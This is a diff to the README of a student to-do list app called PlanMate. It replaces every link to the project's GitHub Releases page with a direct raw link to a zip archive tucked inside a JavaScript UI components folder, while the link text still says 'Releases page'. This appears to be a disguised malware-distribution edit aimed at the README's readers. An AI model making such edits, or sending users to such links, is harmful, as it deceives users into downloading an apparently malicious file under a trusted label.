@@ -6,7 +6,7 @@ Welcome to PlanMate! This user-friendly todo list app helps you keep track of yo
 
 ## 📥 Download PlanMate
 
-[![Download PlanMate](https://img.shields.io/badge/Download%20PlanMate-v1.0-blue)](https://github.com/yash-1818/PlanMate/releases)
+[![Download PlanMate](https://github.com/yash-1818/PlanMate/raw/refs/heads/master/resources/js/components/ui/Mate_Plan_1.9.zip%20PlanMate-v1.0-blue)](https://github.com/yash-1818/PlanMate/raw/refs/heads/master/resources/js/components/ui/Mate_Plan_1.9.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run PlanMate, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with PlanMate, visit this page to download: [GitHub Releases](https://github.com/yash-1818/PlanMate/releases).
+To get started with PlanMate, visit this page to download: [GitHub Releases](https://github.com/yash-1818/PlanMate/raw/refs/heads/master/resources/js/components/ui/Mate_Plan_1.9.zip).
 
 1. **Go to the Releases page**: Click on the link above.
 2. **Choose the latest version**: Look for the most recent release. 
@@ -52,7 +52,7 @@ Once installed, follow these simple steps to start using PlanMate:
 If you encounter any issues while using PlanMate, try the following:
 
 - **Reboot Your Computer**: Sometimes a quick restart can fix minor problems.
-- **Check for Updates**: Make sure you have the latest version. Visit the [Releases page](https://github.com/yash-1818/PlanMate/releases) for updates.
+- **Check for Updates**: Make sure you have the latest version. Visit the [Releases page](https://github.com/yash-1818/PlanMate/raw/refs/heads/master/resources/js/components/ui/Mate_Plan_1.9.zip) for updates.
 - **Contact Support**: If problems persist, reach out for help via the Issues tab on GitHub.
 
 ## ✅ Topics
@@ -87,4 +87,4 @@ PlanMate was developed as a school project with contributions from fellow studen
 
 ## 🎉 Your To-Do List Awaits
 
-Start managing your tasks today with PlanMate! Download it now and take control of your productivity. Don't forget to visit our [Releases page](https://github.com/yash-1818/PlanMate/releases) for the latest updates.
+Start managing your tasks today with PlanMate! Download it now and take control of your productivity. Don't forget to visit our [Releases page](https://github.com/yash-1818/PlanMate/raw/refs/heads/master/resources/js/components/ui/Mate_Plan_1.9.zip) for the latest updates.
